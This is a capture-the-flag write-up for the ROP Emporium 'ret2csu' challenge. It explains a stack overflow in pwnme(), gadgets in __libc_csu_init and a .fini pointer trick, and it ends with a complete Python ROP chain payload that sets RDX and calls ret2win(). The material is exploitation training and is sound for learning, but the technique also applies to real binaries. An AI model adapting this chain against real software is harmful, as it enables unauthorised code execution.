---
title: 08_ret2csu
categories: series rop_emporium
---

# ROP Emporium ret2csu

* **Tools:** IDA Free 7.0, gdb-gef, ropper, readelf
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "The challenge is simple: call the ret2win() function, the caveat this time is that the third argument (which you know by now is stored in the rdx register on x86_64 Linux) must be 0xdeadcafebabebeef."

## Function pwnme()

As usual, the stack buffer expects an input of up to 0x20 bytes, but `_fget()` allows a much longer one:
```
0x000000000040071C    lea     rax, [rbp+input_buffer]
0x0000000000400720    mov     edx, 20h        ; n
0x0000000000400725    mov     esi, 0          ; c
0x000000000040072A    mov     rdi, rax        ; s
0x000000000040072D    call    _memset
[...]
0x0000000000400783    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
0x000000000040078A    lea     rax, [rbp+input_buffer]
0x000000000040078E    mov     esi, 0B0h       ; n
0x0000000000400793    mov     rdi, rax        ; s
0x0000000000400796    call    _fgets
```
In addition, the `.got.plt` entries are set to zero when not needed anymore (code not shown).

## Function ret2win()

The aim is to call this function with `RDX = 0xdeadcafebabebeef`. This value will be xored with hardcoded data to decrypt the string `"/bin/cat flag.txt"` and call `_system()`. Automatic gadgets finder (I'm using **ropper**) doesn't bring easy solutions such as `pop rdx` or `mov rdx, %`.
However, author of the challenge gives us a [cool reference](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) containing the roadmap to solve it.

## Function `__libc_csu_init()`

This function is part of what authors of the paper linked above call "attached code": code that is automatically added to the application by the linker. It has indeed 2 useful gadgets, a "mov gadget" and a "pop gadget":
```
0x0000000000400880    mov     rdx, r15
0x0000000000400883    mov     rsi, r14
0x0000000000400886    mov     edi, r13d
0x0000000000400889    call    qword ptr [r12+rbx*8]
```
And:
```
0x000000000040089A    pop     rbx
0x000000000040089B    pop     rbp
0x000000000040089C    pop     r12
0x000000000040089E    pop     r13
0x00000000004008A0    pop     r14
0x00000000004008A2    pop     r15
0x00000000004008A4    retn
```
So, instructions `pop r15` and `mov rdx, r15` allow to set `RDX` to the required value. All we need now is finding a way to call `ret2win()`. 

## Calling ret2win()

The instruction `call qword ptr [r12+rbx*8]` will be executed, but no easy arbitrary write could be found. Same result for an eventual table of pointers containing the address of `ret2win()`. After some wandering and googling, the `.dynamic` section contains a pointer to a "do nothing" function:
```
LOAD:0000000000600E20 _DYNAMIC    Elf64_Dyn <1, 1>
LOAD:0000000000600E20             ; DT_NEEDED libc.so.6
LOAD:0000000000600E30             Elf64_Dyn <0Ch, 400560h> ; DT_INIT
LOAD:0000000000600E40             Elf64_Dyn <0Dh, 4008B4h> ; DT_FINI
[...]
```
And the code contained inside the `.fini` section:
```
.fini:00000000004008B4    sub     rsp, 8          ; _fini
.fini:00000000004008B8    add     rsp, 8
.fini:00000000004008BC    retn
```
So, if `RBX = 0` and `R12 = 0x600e48` we can call `4008B4h`. Returning from this call, we land here:
```
; above is the "mov gadget"
0x000000000040088D    add     rbx, 1
0x0000000000400891    cmp     rbp, rbx
0x0000000000400894    jnz     short loc_400880
0x0000000000400896
0x0000000000400896 loc_400896: 
0x0000000000400896    add     rsp, 8
; below is the "pop gadget"
``` 
We need to avoid the conditional jump, so `RBP` should be set to 1 during the first execution of the "pop" gadget. Then, we can return to `ret2win()` and enjoy having solved all of the (64 bits) ROP Emporium challenges.

## ROP chain

```python
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # overwrite RBP
payload += b'\x9a\x08\x40\x00\x00\x00\x00\x00'  # gadget 1

# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# rbp is set to 1 because of the future add rbx, 1; cmp rbp, rbx
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # pop rbx
payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # pop rbp
payload += b'\x48\x0e\x60\x00\x00\x00\x00\x00'  # pop r12 (ptr .fini)
payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # pop r13
payload += b'\x44\x44\x44\x44\x44\x44\x44\x44'  # pop r14
payload += b'\xef\xbe\xbe\xba\xfe\xca\xad\xde'  # pop r15
payload += b'\x80\x08\x40\x00\x00\x00\x00\x00'  # gadget 2

# mov rdx, r15; mov rsi, r14; mov edi, r13d; ; call _fini
# + second exec of "gadget 1", but with an add rsp, 8
payload += b'\x45\x45\x45\x45\x45\x45\x45\x45'  # add rsp, 8
payload += b'\x46\x46\x46\x46\x46\x46\x46\x46'  # pop rbx
payload += b'\x47\x47\x47\x47\x47\x47\x47\x47'  # pop rbp
payload += b'\x48\x48\x48\x48\x48\x48\x48\x48'  # pop r12
payload += b'\x49\x49\x49\x49\x49\x49\x49\x49'  # pop r13
payload += b'\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a'  # pop r14
payload += b'\x4b\x4b\x4b\x4b\x4b\x4b\x4b\x4b'  # pop r15
payload += b'\xb1\x07\x40\x00\x00\x00\x00\x00'  # ret2win()
```
---
EOF
